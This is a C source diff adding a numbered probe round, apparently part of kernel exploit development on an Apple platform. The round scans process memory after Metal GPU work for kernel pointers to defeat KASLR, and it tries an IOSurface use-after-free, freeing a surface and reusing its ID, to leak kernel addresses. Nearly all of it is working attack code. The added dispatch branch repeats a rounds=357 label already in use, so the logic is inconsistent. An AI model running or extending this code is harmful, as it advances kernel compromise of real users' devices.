@@ -14738,6 +14738,429 @@ r354_done:
     (void)0;
 }
 
+static void r354_probe(void) {
+    rlog("\n=== r354: Targeted VM Region Rescan — Stack + Shared Cache ===\n\n");
+    fflush(stdout);
+
+    kern_return_t kr;
+
+    /* Relaxed kernel pointer check: no alignment requirement, catches values like 0xfffffffefb9e4263 */
+    #define IS_KPTR354(v) ( \
+        ((v) != 0) && \
+        ((v) != 0xFFFFFFFFFFFFFFFFULL) && \
+        ((v) != 0xFFFFFFFF00000000ULL) && \
+        ((v) != 0xFFFFFFFF00000001ULL) && \
+        ((v) != 0xFFFFFFFF89ABCDEFULL) && \
+        ((v) != 0xFFFFFFFFFFFFFFD1ULL) && \
+        ((v) >> 32) >= 0xFFFFFFF0UL \
+    )
+
+    /* ---- Part 1: Find and scan ALL tag=30 (VM_MEMORY_STACK) regions ---- */
+    rlog("--- Part 1: Scan all VM_MEMORY_STACK (tag=30) regions ---\n");
+    rlog("  r352 found changing values in tag=30 at ~0x16b8d0000, offsets 466800-469400\n\n");
+    fflush(stdout);
+    {
+        /* First, trigger GPU work to leave kernel values on thread stacks */
+        void *metal_lib = dlopen("/System/Library/Frameworks/Metal.framework/Metal", RTLD_LAZY);
+        void *(*msgSend)(void*, void*, ...) = dlsym(RTLD_DEFAULT, "objc_msgSend");
+        void *(*regSel)(const char*) = dlsym(RTLD_DEFAULT, "sel_registerName");
+        void *dev = NULL, *cmdQ = NULL;
+        if (metal_lib) {
+            typedef void *(*MTLCreateDev_t)(void);
+            MTLCreateDev_t createDev = (MTLCreateDev_t)dlsym(metal_lib, "MTLCreateSystemDefaultDevice");
+            if (createDev) dev = createDev();
+            if (dev) cmdQ = ((void*(*)(void*,void*))msgSend)(dev, regSel("newCommandQueue"));
+        }
+
+        /* Submit GPU work */
+        if (cmdQ) {
+            void *buf = ((void*(*)(void*,void*,size_t,unsigned long))msgSend)(
+                dev, regSel("newBufferWithLength:options:"), (size_t)65536, 0UL);
+            for (int batch = 0; batch < 5; batch++) {
+                void *cmdBuf = ((void*(*)(void*,void*))msgSend)(cmdQ, regSel("commandBuffer"));
+                if (!cmdBuf) continue;
+                void *blit = ((void*(*)(void*,void*))msgSend)(cmdBuf, regSel("blitCommandEncoder"));
+                if (blit && buf) {
+                    typedef struct { unsigned long loc; unsigned long len; } NSR354;
+                    NSR354 r = {0, 65536};
+                    ((void(*)(void*,void*,void*,NSR354,uint8_t))msgSend)(
+                        blit, regSel("fillBuffer:range:value:"), buf, r, 0xDD + batch);
+                    ((void(*)(void*,void*))msgSend)(blit, regSel("endEncoding"));
+                }
+                ((void(*)(void*,void*))msgSend)(cmdBuf, regSel("commit"));
+                ((void(*)(void*,void*))msgSend)(cmdBuf, regSel("waitUntilCompleted"));
+            }
+            if (buf) ((void(*)(void*,void*))msgSend)(buf, regSel("release"));
+        }
+
+        /* PASS 1: scan all stack regions */
+        rlog("  Pass 1 scan:\n");
+        mach_vm_address_t addr = 0;
+        mach_vm_size_t sz = 0;
+        uint32_t depth = 0;
+        struct vm_region_submap_info_64 info;
+        mach_msg_type_number_t cnt;
+
+        typedef struct { mach_vm_address_t addr; mach_vm_size_t sz; } stack_region_t;
+        stack_region_t stack_regions[32];
+        int n_stack = 0;
+
+        /* Collect kernel-range values for comparison */
+        typedef struct { size_t offset; uint64_t val; int region_idx; } kval_entry_t;
+        kval_entry_t pass1_vals[200];
+        int p1_count = 0;
+
+        while (1) {
+            cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+            depth = 0;
+            kr = mach_vm_region_recurse(mach_task_self(), &addr, &sz, &depth,
+                (vm_region_recurse_info_t)&info, &cnt);
+            if (kr != 0) break;
+
+            if (info.user_tag == 30 && info.protection >= 3 && n_stack < 32) {
+                stack_regions[n_stack] = (stack_region_t){addr, sz};
+                rlog("  Stack[%d]: 0x%llx sz=0x%llx prot=%d\n",
+                    n_stack, (unsigned long long)addr, (unsigned long long)sz, info.protection);
+
+                /* Scan for kernel-range values */
+                uint64_t *base = (uint64_t *)(uintptr_t)addr;
+                size_t nqw = (size_t)sz / 8;
+                if (nqw > 131072) nqw = 131072; /* cap at 1MB */
+                int hits = 0;
+                for (size_t i = 0; i < nqw && p1_count < 200; i++) {
+                    uint64_t v = base[i];
+                    if (IS_KPTR354(v)) {
+                        pass1_vals[p1_count] = (kval_entry_t){i * 8, v, n_stack};
+                        p1_count++;
+                        if (hits < 10) {
+                            rlog("    +%zu = 0x%llx\n", i * 8, (unsigned long long)v);
+                        }
+                        hits++;
+                    }
+                }
+                if (hits > 10) rlog("    ... (%d total hits)\n", hits);
+                n_stack++;
+            }
+            addr += sz;
+        }
+        rlog("  Pass 1: %d stack regions, %d kernel-range values\n\n", n_stack, p1_count);
+
+        /* Submit more GPU work between passes */
+        if (cmdQ) {
+            void *buf = ((void*(*)(void*,void*,size_t,unsigned long))msgSend)(
+                dev, regSel("newBufferWithLength:options:"), (size_t)262144, 0UL);
+            for (int batch = 0; batch < 5; batch++) {
+                void *cmdBuf = ((void*(*)(void*,void*))msgSend)(cmdQ, regSel("commandBuffer"));
+                if (!cmdBuf) continue;
+                void *blit = ((void*(*)(void*,void*))msgSend)(cmdBuf, regSel("blitCommandEncoder"));
+                if (blit && buf) {
+                    typedef struct { unsigned long loc; unsigned long len; } NSR354b;
+                    NSR354b r = {0, 262144};
+                    ((void(*)(void*,void*,void*,NSR354b,uint8_t))msgSend)(
+                        blit, regSel("fillBuffer:range:value:"), buf, r, 0xEE + batch);
+                    ((void(*)(void*,void*))msgSend)(blit, regSel("endEncoding"));
+                }
+                ((void(*)(void*,void*))msgSend)(cmdBuf, regSel("commit"));
+                ((void(*)(void*,void*))msgSend)(cmdBuf, regSel("waitUntilCompleted"));
+            }
+            if (buf) ((void(*)(void*,void*))msgSend)(buf, regSel("release"));
+        }
+
+        /* PASS 2: re-scan same regions */
+        rlog("  Pass 2 scan (after more GPU work):\n");
+        int changed_count = 0;
+        uint64_t changed_vals[20];
+        int n_changed_unique = 0;
+
+        for (int ri = 0; ri < n_stack; ri++) {
+            uint64_t *base = (uint64_t *)(uintptr_t)stack_regions[ri].addr;
+            size_t nqw = (size_t)stack_regions[ri].sz / 8;
+            if (nqw > 131072) nqw = 131072;
+
+            /* Re-check pass1 values in this region */
+            for (int pi = 0; pi < p1_count; pi++) {
+                if (pass1_vals[pi].region_idx != ri) continue;
+                size_t qi = pass1_vals[pi].offset / 8;
+                if (qi >= nqw) continue;
+                uint64_t v2 = base[qi];
+                if (v2 != pass1_vals[pi].val) {
+                    rlog("  *** CHANGED Stack[%d]+%zu: 0x%llx -> 0x%llx ***\n",
+                        ri, pass1_vals[pi].offset,
+                        (unsigned long long)pass1_vals[pi].val, (unsigned long long)v2);
+                    changed_count++;
+                    /* Track unique new values */
+                    if (IS_KPTR354(v2)) {
+                        int dup = 0;
+                        for (int k = 0; k < n_changed_unique; k++) {
+                            if (changed_vals[k] == v2) { dup = 1; break; }
+                        }
+                        if (!dup && n_changed_unique < 20) {
+                            changed_vals[n_changed_unique++] = v2;
+                        }
+                    }
+                }
+            }
+        }
+        rlog("  Pass 2: %d values changed, %d unique new kernel-range values\n\n", changed_count, n_changed_unique);
+
+        /* Analyze changed values */
+        if (n_changed_unique > 0) {
+            rlog("  === CHANGED VALUE ANALYSIS ===\n");
+            for (int i = 0; i < n_changed_unique; i++) {
+                uint64_t v = changed_vals[i];
+                rlog("  [%d] 0x%llx\n", i, (unsigned long long)v);
+                /* Check vs unslid kernel text base */
+                if (v >= 0xfffffff007004000ULL && v < 0xfffffff027004000ULL) {
+                    uint64_t slide = v - 0xfffffff007004000ULL;
+                    rlog("       KERNEL TEXT RANGE: possible slide = 0x%llx (%s)\n",
+                        (unsigned long long)slide,
+                        (slide & 0x3FFF) == 0 ? "page-aligned!" : "not page-aligned");
+                }
+                /* Check if it looks like kernel heap */
+                if (v >= 0xfffffffe00000000ULL && v < 0xfffffff000000000ULL) {
+                    rlog("       KERNEL HEAP RANGE (0xfffffffe...)\n");
+                }
+                /* Check vs other known bases */
+                if (v >= 0xfffffff000000000ULL && v < 0xfffffff007000000ULL) {
+                    rlog("       PRE-TEXT KERNEL RANGE\n");
+                }
+                /* Page alignment */
+                rlog("       Aligned: 16=%s 4K=%s 16K=%s\n",
+                    (v & 0xF) == 0 ? "Y" : "N",
+                    (v & 0xFFF) == 0 ? "Y" : "N",
+                    (v & 0x3FFF) == 0 ? "Y" : "N");
+            }
+        }
+
+        if (cmdQ) ((void(*)(void*,void*))msgSend)(cmdQ, regSel("release"));
+        if (metal_lib) dlclose(metal_lib);
+    }
+
+    /* ---- Part 2: Scan ALL large r-x regions for kernel VA tables ---- */
+    rlog("\n--- Part 2: All r-x regions — find kernel VA constant table ---\n");
+    rlog("  r352 found constants at offsets 761888-766280 in a large r-x region\n\n");
+    fflush(stdout);
+    {
+        mach_vm_address_t addr = 0;
+        mach_vm_size_t sz = 0;
+        uint32_t depth = 0;
+        struct vm_region_submap_info_64 info;
+        mach_msg_type_number_t cnt;
+        int rx_count = 0;
+
+        while (1) {
+            cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+            depth = 0;
+            kr = mach_vm_region_recurse(mach_task_self(), &addr, &sz, &depth,
+                (vm_region_recurse_info_t)&info, &cnt);
+            if (kr != 0) break;
+
+            /* Look for ANY r-x region */
+            if (info.protection == 5 && sz > 0x10000) {
+                uint64_t *base = (uint64_t *)(uintptr_t)addr;
+                size_t nqw = (size_t)sz / 8;
+                if (nqw > 262144) nqw = 262144; /* cap at 2MB scan */
+
+                /* Count kernel-range values */
+                int kcount = 0;
+                size_t first_offset = 0;
+                for (size_t i = 0; i < nqw; i++) {
+                    uint64_t v = base[i];
+                    if (IS_KPTR354(v)) {
+                        if (kcount == 0) first_offset = i * 8;
+                        kcount++;
+                    }
+                }
+
+                if (kcount > 0) {
+                    rlog("  r-x[%d]: 0x%llx sz=0x%llx tag=%u — %d kernel values (first at +%zu)\n",
+                        rx_count, (unsigned long long)addr, (unsigned long long)sz,
+                        info.user_tag, kcount, first_offset);
+
+                    /* If this region has many kernel values, dump them all */
+                    if (kcount >= 5) {
+                        rlog("    Detailed dump:\n");
+                        int dumped = 0;
+                        for (size_t i = 0; i < nqw && dumped < 50; i++) {
+                            uint64_t v = base[i];
+                            if (IS_KPTR354(v)) {
+                                /* Classify */
+                                const char *cls = "?";
+                                if (v == 0xfffffff007004000ULL) cls = "UNSLID_TEXT_BASE";
+                                else if (v == 0xfffffff007000000ULL) cls = "KVAS_START";
+                                else if (v == 0xfffffff027004000ULL) cls = "KVAS+0x20000000";
+                                else if (v == 0xfffffff037004000ULL) cls = "KVAS+0x30000000";
+                                else if (v == 0xfffffff047004000ULL) cls = "KVAS+0x40000000";
+                                else if (v == 0xfffffff017004000ULL) cls = "KVAS+0x10000000";
+                                else if (v == 0xfffffff00f004000ULL) cls = "KVAS+0x08000000";
+                                else if (v >= 0xfffffff007004000ULL && v < 0xfffffff027004000ULL) {
+                                    uint64_t s = v - 0xfffffff007004000ULL;
+                                    if ((s & 0x3FFF) == 0) cls = "SLID_CANDIDATE!";
+                                    else cls = "TEXT_RANGE_UNALIGNED";
+                                } else if (v >= 0xfffffffe00000000ULL && v < 0xfffffff000000000ULL) {
+                                    cls = "HEAP_RANGE";
+                                }
+                                rlog("      +%zu = 0x%llx [%s]\n", i * 8, (unsigned long long)v, cls);
+                                dumped++;
+                            }
+                        }
+                    }
+                }
+                rx_count++;
+            }
+            addr += sz;
+        }
+        rlog("  Scanned %d r-x regions\n", rx_count);
+    }
+
+    /* ---- Part 3: Scan AGX/GPU regions (tag=100) ---- */
+    rlog("\n--- Part 3: AGX/GPU tagged regions (tag=100, 240-255) ---\n");
+    fflush(stdout);
+    {
+        mach_vm_address_t addr = 0;
+        mach_vm_size_t sz = 0;
+        uint32_t depth = 0;
+        struct vm_region_submap_info_64 info;
+        mach_msg_type_number_t cnt;
+
+        while (1) {
+            cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+            depth = 0;
+            kr = mach_vm_region_recurse(mach_task_self(), &addr, &sz, &depth,
+                (vm_region_recurse_info_t)&info, &cnt);
+            if (kr != 0) break;
+
+            if ((info.user_tag == 100 || (info.user_tag >= 240 && info.user_tag <= 255)) &&
+                info.protection >= 1 && sz >= 0x1000) {
+                uint64_t *base = (uint64_t *)(uintptr_t)addr;
+                size_t nqw = (size_t)sz / 8;
+                if (nqw > 65536) nqw = 65536;
+
+                int kcount = 0;
+                for (size_t i = 0; i < nqw; i++) {
+                    uint64_t v = base[i];
+                    if (IS_KPTR354(v)) {
+                        if (kcount < 15) {
+                            rlog("  tag=%u 0x%llx+%zu = 0x%llx\n",
+                                info.user_tag, (unsigned long long)addr,
+                                i * 8, (unsigned long long)v);
+                        }
+                        kcount++;
+                    }
+                }
+                if (kcount > 15) rlog("  ... (%d total in this region)\n", kcount);
+            }
+            addr += sz;
+        }
+    }
+
+    /* ---- Part 4: IOSurface UAF — read internal struct fields ---- */
+    rlog("\n--- Part 4: IOSurface internal struct field read via UAF ---\n");
+    fflush(stdout);
+    {
+        /* The UAF primitive: create surfA, get Mach port, free surfA,
+           create surfB (gets same ID), use portA to access surfB.
+           Try to read fields that might contain kernel pointers. */
+        CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w=64, h=64, bpe=4, bpr=256, pf=0x42475241, as=64*64*4;
+        CFNumberRef nums[6];
+        nums[0]=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        nums[1]=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        nums[2]=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        nums[3]=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        nums[4]=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        nums[5]=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(props,CFSTR("IOSurfaceWidth"),nums[0]);
+        CFDictionarySetValue(props,CFSTR("IOSurfaceHeight"),nums[1]);
+        CFDictionarySetValue(props,CFSTR("IOSurfaceBytesPerElement"),nums[2]);
+        CFDictionarySetValue(props,CFSTR("IOSurfaceBytesPerRow"),nums[3]);
+        CFDictionarySetValue(props,CFSTR("IOSurfacePixelFormat"),nums[4]);
+        CFDictionarySetValue(props,CFSTR("IOSurfaceAllocSize"),nums[5]);
+        for (int i = 0; i < 6; i++) CFRelease(nums[i]);
+
+        /* Create surfA, get port, release surfA */
+        IOSurfaceRef surfA = IOSurfaceCreate(props);
+        uint32_t idA = surfA ? IOSurfaceGetID(surfA) : 0;
+        mach_port_t portA = MACH_PORT_NULL;
+        if (surfA) portA = IOSurfaceCreateMachPort(surfA);
+        rlog("  surfA id=%u port=0x%x\n", idA, portA);
+
+        if (surfA) CFRelease(surfA); /* free surfA */
+        surfA = NULL;
+
+        /* Create surfB — should reuse same ID */
+        IOSurfaceRef surfB = IOSurfaceCreate(props);
+        uint32_t idB = surfB ? IOSurfaceGetID(surfB) : 0;
+        rlog("  surfB id=%u (reuse=%s)\n", idB, idB == idA ? "YES" : "NO");
+
+        /* Look up via portA — should get surfB */
+        IOSurfaceRef surfC = NULL;
+        if (portA != MACH_PORT_NULL) {
+            surfC = IOSurfaceLookupFromMachPort(portA);
+            uint32_t idC = surfC ? IOSurfaceGetID(surfC) : 0;
+            rlog("  lookup via portA -> id=%u\n", idC);
+        }
+
+        /* Now try to read various property keys that might leak kernel info */
+        IOSurfaceRef target = surfC ? surfC : surfB;
+        if (target) {
+            const char *keys[] = {
+                "IOSurfaceAddress", "IOSurfaceKernelAddress", "IOSurfacePhysicalAddress",
+                "IOSurfaceRegistryID", "IOSurfaceAllocTag", "IOSurfaceMapOffset",
+                "IOSurfaceOffset", "IOSurfacePlaneBase", "IOSurfacePlaneOffset",
+                "IOSurfacePlaneSize", "IOSurfacePlaneBytesPerRow",
+                "IOSurfaceGlobalID", "IOSurfaceBaseAddress",
+                "IOSurfacePurgeableState", "IOSurfaceTimestamp",
+                "IOSurfaceBulkAttachments", "IOSurfaceIsInUse",
+                "IOSurfaceSeed", "IOSurfaceUseCount",
+                NULL
+            };
+            for (int i = 0; keys[i]; i++) {
+                CFStringRef key = CFStringCreateWithCString(NULL, keys[i], kCFStringEncodingUTF8);
+                CFTypeRef val = IOSurfaceCopyValue(target, key);
+                if (val) {
+                    CFTypeID tid = CFGetTypeID(val);
+                    if (tid == CFNumberGetTypeID()) {
+                        int64_t nv = 0;
+                        CFNumberGetValue((CFNumberRef)val, kCFNumberSInt64Type, &nv);
+                        rlog("  %s = %lld (0x%llx)\n", keys[i], (long long)nv, (unsigned long long)nv);
+                        if (IS_KPTR354((uint64_t)nv)) {
+                            rlog("    *** KERNEL POINTER! ***\n");
+                        }
+                    } else if (tid == CFDataGetTypeID()) {
+                        CFIndex len = CFDataGetLength((CFDataRef)val);
+                        const uint8_t *bytes = CFDataGetBytePtr((CFDataRef)val);
+                        rlog("  %s = <data len=%ld>\n", keys[i], (long)len);
+                        /* Scan data for kernel pointers */
+                        for (CFIndex j = 0; j + 8 <= len; j += 8) {
+                            uint64_t dv;
+                            memcpy(&dv, bytes + j, 8);
+                            if (IS_KPTR354(dv)) {
+                                rlog("    +%ld = 0x%llx ***KPTR***\n", (long)j, (unsigned long long)dv);
+                            }
+                        }
+                    } else {
+                        rlog("  %s = <type %lu>\n", keys[i], (unsigned long)tid);
+                    }
+                    CFRelease(val);
+                }
+                CFRelease(key);
+            }
+        }
+
+        /* Cleanup */
+        if (surfC) CFRelease(surfC);
+        if (surfB) CFRelease(surfB);
+        if (portA != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), portA);
+        CFRelease(props);
+    }
+
+    rlog("\n=== r354 complete ===\n");
+    fflush(stdout);
+    #undef IS_KPTR354
+}
+
 /* r353 helpers */
 static int r353_is_known_constant(uint64_t v) {
     uint64_t known[] = {
@@ -50871,6 +51294,14 @@ new_modes:
             rlog("*** rounds=357: KASLR Bypass — Deep Stack Scan Across Metal Passes ***\n");
             rlog("  r352 found 0xFFFFFFFEFBxxxxxx at stack+466800, changed between passes.\n");
             rlog("  r354: scan FULL stack VM region in 2 passes + full VM 0xFFFFFFFE scan.\n\n");
+            fflush(stdout);
+            r354_probe();
+            goto done;
+        }
+        if (rounds == 357) {
+            rlog("*** rounds=357: VM Region Rescan — relaxed filter, stack + cache ***\n");
+            rlog("  r353: 0 hits (alignment filter + wrong region). Fixing both.\n");
+            rlog("  Relaxed IS_KPTR (no alignment), 2-pass stack scan, all r-x regions.\n\n");
             fflush(stdout);
             r354_probe();
             goto done;
